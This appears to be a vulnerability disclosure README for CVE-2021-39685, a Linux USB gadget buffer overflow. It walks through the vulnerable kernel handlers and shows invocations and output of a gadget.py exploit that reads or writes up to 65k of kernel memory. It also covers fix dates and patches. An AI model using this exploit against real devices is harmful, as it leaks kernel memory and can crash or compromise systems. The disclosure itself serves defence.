# inspector-gadget

```
    Go Go Gadget Exploit!
     _..--"\  `|`""--.._
  .-'       \  |        `'-.
 /           \_|___...----'`\
|__,,..--""``(_)--..__      |
'\     _.--'`.I._     ''--..'
  `''"`,#JGS/_|_\###,---'`
    ,#'  _.:`___`:-._ '#,
   #'  ,~'-;(oIo);-'~, '#
   #   `~-(  |    )=~`  #
   #       | |_  |      #
   #       ; ._. ;      #
   #  _..-;|\ - /|;-._  #
   #-'   /_ \\_// _\  '-#
 /`#    ; /__\-'__\;    #`\
;  #\.--|  |O  O   |'-./#  ;
|__#/   \ _;O__O___/   \#__|
 | #\    [I_[_]__I]    /# |
 \_(#   /  |O  O   \   #)_/
       /   |        \
      /    |         \
     /    /\          \
    /     | `\         ;
   ;      \   '.       |
    \-._.__\     \_..-'/
     '.\  \-.._.-/  /'`
        \_.\    /._/
         \_.;  ;._/
       .-'-./  \.-'-.
      (___.'    '.___)
```

## Summary

An attacker can access kernel memory bypassing valid buffer boundaries by exploiting implementation of control request handlers in the following usb gadgets - rndis, hid, uac1, uac1_legacy and uac2. Processing of malicious control transfer requests with unexpectedly large wLength lacks assurance that this value does not exceed the buffer size. Due to this fact one is capable of reading and/or writing (depending on particular case) up to 65k of kernel memory.

## Description

Some execution paths of usb control transfer handlers of gadgets such as rndis, hid, uac1, uac1_legacy and uac2 do not include proper handling of request length (wLength). This value should be limited to buffer size to prevent buffer overflow vulnerabilities in the data transfer phase.

The buffer used by endpoint 0 is allocated in composite.c with size of USB_COMP_EP0_BUFSIZ (4096) bytes so
setting wLength to a value greater than USB_COMP_EP0_BUFSIZ will result in a buffer overflow.

For example in the case of f_uac1.c, execution of the f_audio_setup function allows one to perform both reads and writes past buffer boundaries. Neither f_audio_setup nor none of the called functions - audio_set_endpoint_req, audio_get_endpoint_req, out_rq_cur, ac_rq_in limit the return value to be smaller than the buffer size. Consequently the data transfer phase uses req->length = value = ctrl->wLength which is controlled by the attacker. This allows one to either read or write up to 65k bytes of kernel memory depending on the control transfer direction.

```
    static int
    f_audio_setup(struct usb_function *f, const struct usb_ctrlrequest *ctrl)
    {
            struct usb_composite_dev *cdev = f->config->cdev;
            struct usb_request      *req = cdev->req;
            int                     value = -EOPNOTSUPP;
            u16                     w_index = le16_to_cpu(ctrl->wIndex);
            u16                     w_value = le16_to_cpu(ctrl->wValue);
            u16                     w_length = le16_to_cpu(ctrl->wLength);

            /* composite driver infrastructure handles everything; interface
             * activation uses set_alt().
             */
            switch (ctrl->bRequestType) {
            case USB_DIR_OUT | USB_TYPE_CLASS | USB_RECIP_ENDPOINT:
                    value = audio_set_endpoint_req(f, ctrl);
                    break;

            case USB_DIR_IN | USB_TYPE_CLASS | USB_RECIP_ENDPOINT:
                    value = audio_get_endpoint_req(f, ctrl);
                    break;
            case USB_DIR_OUT | USB_TYPE_CLASS | USB_RECIP_INTERFACE:
                    if (ctrl->bRequest == UAC_SET_CUR)
                            value = out_rq_cur(f, ctrl);
                    break;
            case USB_DIR_IN | USB_TYPE_CLASS | USB_RECIP_INTERFACE:
                    value = ac_rq_in(f, ctrl);
                    break;
            default:
                    ERROR(cdev, "invalid control req%02x.%02x v%04x i%04x l%d\n",
                            ctrl->bRequestType, ctrl->bRequest,
                            w_value, w_index, w_length);
            }

            /* respond with data transfer or status phase? */
            if (value >= 0) {
                    DBG(cdev, "audio req%02x.%02x v%04x i%04x l%d\n",
                            ctrl->bRequestType, ctrl->bRequest,
                            w_value, w_index, w_length);
                    req->zero = 0;
                    req->length = value;
                    value = usb_ep_queue(cdev->gadget->ep0, req, GFP_ATOMIC);

                    if (value < 0)
                            ERROR(cdev, "audio response on err %d\n", value);
            }

            /* device either stalls (value < 0) or reports success */
            return value;
    }
```

Execution of the sample readout exploit allows dumping of up to 65k of memory.

```
    $ ./gadget.py -v 0x1b67 -p 0x400c -f uac1 | wc -c
    65535
```

```
    $ ./gadget.py -v 0x1b67 -p 0x400c -f uac1 | strings

    nsole=tty1 root=PARTUUID=e02024cb-02 rootfstype=ext4 elevator=deadline fsck.repair=yes rootwait modules-load=dwc2
    tem.slice/system-getty.slice/getty@ttyGS0.service
    !rE*
    ?& .4!
    0usb_composite_setup_continue
    composite_setup
    usb_gadget_get_string
    usb_otg_descriptor_init
    usb_otg_descriptor_alloc
    usb_free_all_descriptors
    usb_assign_descriptors
    usb_copy_descriptors

    usb_gadget_config_buf
```

On the other hand, execution of the overwrite exploit allows one to write arbitrary data past expected buffer boundaries.
```
    $ ./gadget.py -v 0x1b67 -p 0x400c -f uac1 -d write

    Message from syslogd@zero at Dec  6 19:56:01 ...
     kernel:[  103.850206] Internal error: Oops: 5 [#1] ARM
```

Similarly in case of the rndis gadget the rndis_setup function can be exploited to write past buffer boundaries using control transfer request with direction out, type class, recipient interface and bRequest set to USB_CDC_SEND_ENCAPSULATED_COMMAND.

```
    static int
    rndis_setup(struct usb_function *f, const struct usb_ctrlrequest *ctrl)
    {
            struct f_rndis          *rndis = func_to_rndis(f);
            struct usb_composite_dev *cdev = f->config->cdev;
            struct usb_request      *req = cdev->req;
            int                     value = -EOPNOTSUPP;
            u16                     w_index = le16_to_cpu(ctrl->wIndex);
            u16                     w_value = le16_to_cpu(ctrl->wValue);
            u16                     w_length = le16_to_cpu(ctrl->wLength);
            /* composite driver infrastructure handles everything except
             * CDC class messages; interface activation uses set_alt().
             */
            switch ((ctrl->bRequestType << 8) | ctrl->bRequest) {
            /* RNDIS uses the CDC command encapsulation mechanism to implement
             * an RPC scheme, with much getting/setting of attributes by OID.
             */
            case ((USB_DIR_OUT | USB_TYPE_CLASS | USB_RECIP_INTERFACE) << 8)
                            | USB_CDC_SEND_ENCAPSULATED_COMMAND:
                    if (w_value || w_index != rndis->ctrl_id)
                            goto invalid;
                    /* read the request; process it later */
                    value = w_length;
                    req->complete = rndis_command_complete;
                    req->context = rndis;
                    /* later, rndis_response_available() sends a notification */
                    break;

     ...

     ...

            /* respond with data transfer or status phase? */
            if (value >= 0) {
                    DBG(cdev, "rndis req%02x.%02x v%04x i%04x l%d\n",
                            ctrl->bRequestType, ctrl->bRequest,
                            w_value, w_index, w_length);
                    req->zero = (value < w_length);
                    req->length = value;
                    value = usb_ep_queue(cdev->gadget->ep0, req, GFP_ATOMIC);
                    if (value < 0)
                            ERROR(cdev, "rndis response on err %d\n", value);
            }
            /* device either stalls (value < 0) or reports success */
            return value;

    }
```

Vulnerable execution paths:
- f_rndis.c
    - rndis_setup
- f_uac1.c
    - out_rq_cur
    - ac_rq_in
    - audio_set_endpoint_req
    - audio_get_endpoint_req
- f_uac1_legacy.c
    - audio_set_intf_req
    - audio_set_endpoint_req
    - audio_get_endpoint_req
- f_uac2.c
    - out_rq_cur
- f_hid.c
    - hid_gsetup for HID_REQ_SET_REPORT case

## Impact

Devices implementing affected usb device gadget classes (rndis, hid, uac1, uac1_legacy, uac2) may be affected by buffer overflow vulnerabilities resulting in information disclosure, denial of service or execution of arbitrary code in kernel context.

## Expected resolution

Limit the transfer phase size to min(len, buffer_size) in affected control request handlers to assure that a buffer overflow will not occur.

## Key dates

- 07.12.2021 - reported the issue to Kernel security team
- 09.12.2021 - draft patch provided by Kernel security team
- 12.12.2021 - fix merged to main Linux kernel tree (public)

## CVE

[CVE-2021-39685](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39685)

## Exploit

Issuing control transfer requests with wLength greater than the standard 4096 bytes requires the host to use a custom build of libusb with MAX_CTRL_BUFFER_LENGTH increased to 0xffff. This value can be altered in libusb/os/linux_usbfs.h prior to build.

The gadget.py script requires pyusb. You can install this package via pip as below.

> python3 -m pip install pyusb

Help can be accessed with -h or --help parameters.

```
usage: gadget.py [-h] -v VID -p PID [-l LENGTH] [-d {read,write}]
                 [-f {rndis,uac1,uac1_legacy,uac2,hid}]

Sample exploit for RNDIS gadget class

optional arguments:
  -h, --help            show this help message and exit
  -v VID, --vid VID     vendor id
  -p PID, --pid PID     product id
  -l LENGTH, --length LENGTH
                        lenght of data to write
  -d {read,write}, --direction {read,write}
                        direction of operation from host perspective
  -f {rndis,uac1,uac1_legacy,uac2,hid}, --function {rndis,uac1,uac1_legacy,uac2,hid}
```

Example invocations:
```
./gadget.py -v 0x1b67 -p 0x400c -f uac1
./gadget.py -v 0x1b67 -p 0x400c -f uac1 -d write
./gadget.py -v 0x18d1 -p 0x4e23 -f rndis
```

## Patches

- [USB: gadget: detect too-big endpoint 0 requests](https://github.com/torvalds/linux/commit/153a2d7e3350cc89d406ba2d35be8793a64c2038)
- [USB: gadget: bRequestType is a bitfield, not a enum](https://github.com/torvalds/linux/commit/f08adf5add9a071160c68bb2a61d697f39ab0758)

## Final notes

Please update your kernel to the latest stable version.

